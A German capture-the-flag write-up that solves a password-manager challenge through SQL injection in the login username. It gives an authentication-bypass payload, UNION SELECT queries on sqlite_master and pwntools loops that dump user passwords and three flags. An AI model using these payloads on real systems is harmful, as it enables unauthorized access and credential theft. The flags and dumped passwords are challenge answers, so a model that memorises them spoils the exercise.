Man kann sich als Admin einloggen indem man eine SQL-Injection im Username ausnutzt.
SQL-Injection in Username:
```
Username: `admin'--`         
Password: `a`
```

Durch den Usernamen `admin' AND 1=2 UNION SELECT name, sql, name FROM sqlite_master LIMIT 1,2--` findet man die Tabelle `passwords_legacy_backup_backup`.

Der Username: `admin' AND 1=2 UNION SELECT username_or_note, shared_passphrase, shared_passphrase FROM passwords_legacy_backup_backup--` liefert die erste Flagge `flag{sqlmap?is-this-you?::Rj_C8YP879Sj}`

Mit einem kleinen pwntools Script lassen sich alle Tabellen ermitteln:
```python
    for i in range(20):
      r = conn()
      r.recvuntil(b"Username: ")
      r.sendline(b"admin' AND 1=2 UNION SELECT name, sql, name FROM sqlite_master LIMIT "+ bytes(str(i), 'ascii') + b",1--")
      r.sendline(b"a")
      print(r.recvall(1))
      r.close()
```

```sql
CREATE TABLE credential (
    id INTEGER PRIMARY KEY,
    owner INTEGER NOT NULL,
    name TEXT NOT NULL,
    password TEXT NOT NULL,
    FOREIGN KEY(owner) REFERENCES user(id)
)!
```

```sql
CREATE TABLE passwords_legacy_backup_backup (
    username_or_note TEXT NOT NULL,
    shared_passphrase TEXT NOT NULL
)
```

```sql
CREATE TABLE share (
    credential INTEGER NOT NULL,
    user INTEGER NOT NULL,
    PRIMARY KEY (user, credential),
    FOREIGN KEY(credential) REFERENCES credential(id)
    FOREIGN KEY(user) REFERENCES user(id)
)
```

```sql
CREATE TABLE user (
	id INTEGER PRIMARY KEY,    
	username TEXT NOT NULL,    
	password TEXT NOT NULL
)
```

Wenn man durch die user-tabelle iteriert bekommt man Benutzernamen und Passwörter (und die zweite Flagge als Passwort von alice)
```python
def users():
    for i in range(20):
      r = conn()
      r.recvuntil(b"Username: ")
      r.sendline(b"admin' AND 1=2 UNION SELECT username, password, username FROM user LIMIT "+ bytes(str(i), 'ascii') + b",1--")
      r.sendline(b"a")
      r.recvuntil(b"Welcome, \x1b[1m")
      print(r.recvuntil(b"\x1b[0m!"))
      print(r.recvall(1))
      r.close()
```

```
admin:IA6wdtC0XvbcgY1
alice:flag{dont4get::wuZFQ9BWftBl}
bob:8fwaNI/Y-K.&iAhNd(e@1s)]iB@WeYziYH)[A@f
bruce:In days of yore, from tales of old,\n    Seven Norse heroes, brave and bold,\n    Their deeds and lives, forever told,\n    In an epic passpoem, I'll unfold.\n\n    First, there was Thor, god of thunder,\n    Whose hammer strike did oft put asunder\n    The foes of Asgard, his strength did sunder,\n    A mighty hero, none could outwonder.\n\n    Next, Odin, the all-father wise,\n    With ravens, Huginn and Muninn, spies,\n    He sacrificed much, to gain knowledge that lies,\n    And kept Asgard safe from perilous ties.\n\n    Loki, the trickster, his wit did lend,\n    To aid the gods, or chaos extend,\n    Mischief and trouble, his path did bend,\n    A hero or villain, to the end.\n\n    Then there was Freyja, goddess of love,\n    Her beauty, a gift from the heavens above,\n    Magic and aid, she would freely shove,\n    And heal the hearts of those unloved.\n\n    Skadi, the huntress, skilled in archery,\n    Her aim, never off, no matter the scenery,\n    Married Njord, god of the sea,\n    Together, ruling with grace and harmony.\n\n    Baldur, the shining, loved by all,\n    His death a tragedy, none could forestall,\n    But he returned from the underworld's thrall,\n    Bringing light and hope to answer the call.\n\n    Finally, Heimdall, watchman of the gods,\n    His trumpet, Gjallarhorn, gave many nods,\n    To warn of danger, in far off pods,\n    And keep the peace, as was his odds.\n\n    This passpoem epic, I'll commit to memory,\n    A password strong, without vulnerability,\n    Seven heroes, their deeds of legacy,\n    Protecting my secrets, eternally.
dave:Schneier
frank:r0ckYou1973!3
mallory:y0u-w1ll-n3vEr-9ue55-th1s
randall:correct horse battery staple
student-representative:FiJuonga9aeH
```

Wenn man sich nun als Alice in der Oberfläce anmeldet kann man sich die dritte Flagge anzeigen lassen:

```
Log in with your user account:
Username: alice
Password: flag{dont4get::wuZFQ9BWftBl}

Welcome, alice!

Available credentials:

   id | owner? | name
 ---- | ------ | ------------------------------
    0 |        | PIN equipment locker
    2 |        | Old Exams Share
    3 |  yes   | flag
    5 |        | READ ME!
   15 |        | email password
   16 |        | solutions.zip password
   17 |        | exam2023/24 zip password

[show <id>], [share <id>], [delete <id>], [new], [help], or [quit]? show 3

Name: flag
Password: flag{i-hope-you-protect-my-passwords-cryptographically::cZvQnQ0fcWEh}
```
